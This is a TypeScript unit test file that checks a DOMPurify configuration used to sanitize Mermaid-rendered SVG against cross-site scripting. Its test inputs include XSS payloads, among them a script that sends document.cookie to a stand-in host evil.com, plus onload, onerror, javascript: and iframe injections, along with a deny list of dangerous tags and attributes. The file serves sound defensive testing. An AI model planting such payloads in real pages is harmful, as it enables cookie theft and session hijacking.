// Unit tests for the SVG sanitization config used by mermaid-render.ts
// (M1.S3 — closes SEC-001 / FR-03 / SR-01).
//
// We don't drive mermaid.render() here because it requires a real DOM. What
// we DO test is the exact DOMPurify config that mermaid-render.ts uses to
// sanitize mermaid's SVG output. If a hostile pattern slips past these
// asserts in unit tests, M1.S3's regression test in browser will also fail.
//
// The sanitization config under test is duplicated below from
// src/mainview/mermaid-render.ts intentionally — if that module's config
// drifts, this test should fail and force a deliberate sync.
import { describe, test, expect } from "bun:test";
import DOMPurify from "isomorphic-dompurify";

const MERMAID_SANITIZE_CONFIG = {
	USE_PROFILES: { svg: true, svgFilters: true, html: false },
	ADD_TAGS: ["foreignObject"],
	FORBID_TAGS: ["script", "iframe", "object", "embed", "link"],
	FORBID_ATTR: ["onload", "onerror", "onclick", "onmouseover", "onfocus", "formaction"],
} as const;

function sanitize(svg: string): string {
	return DOMPurify.sanitize(svg, MERMAID_SANITIZE_CONFIG as unknown as Parameters<typeof DOMPurify.sanitize>[1]);
}

describe("mermaid SVG sanitization (M1.S3 config)", () => {
	test("legitimate mermaid SVG is preserved", () => {
		const ok = `<svg xmlns="http://www.w3.org/2000/svg"><g><rect x="0" y="0" width="100" height="50"/><text x="10" y="20">label</text></g></svg>`;
		const out = sanitize(ok);
		expect(out).toContain("<rect");
		expect(out).toContain("<text");
	});

	test("foreignObject is allowed (legitimate mermaid HTML labels)", () => {
		const fo = `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject x="0" y="0" width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml">label</div></foreignObject></svg>`;
		const out = sanitize(fo);
		expect(out).toContain("foreignObject");
	});

	test("hostile <script> inside foreignObject is stripped", () => {
		const hostile = `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><script>fetch('//evil.com/'+document.cookie)</script></foreignObject></svg>`;
		const out = sanitize(hostile);
		expect(out.toLowerCase()).not.toContain("<script");
		expect(out).not.toContain("evil.com");
	});

	test("hostile onload attribute is stripped", () => {
		const hostile = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//evil.com')"><rect/></svg>`;
		const out = sanitize(hostile);
		expect(out.toLowerCase()).not.toContain("onload");
	});

	test("hostile onerror attribute on image inside foreignObject is stripped", () => {
		const hostile = `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><img src="x" onerror="alert(1)"/></foreignObject></svg>`;
		const out = sanitize(hostile);
		expect(out.toLowerCase()).not.toContain("onerror");
	});

	test("javascript: href is stripped", () => {
		const hostile = `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>`;
		const out = sanitize(hostile);
		expect(out.toLowerCase()).not.toContain("javascript:");
	});

	test("hostile <iframe> embedded in SVG is stripped", () => {
		const hostile = `<svg xmlns="http://www.w3.org/2000/svg"><iframe src="//evil.com"></iframe></svg>`;
		const out = sanitize(hostile);
		expect(out.toLowerCase()).not.toContain("<iframe");
	});
});
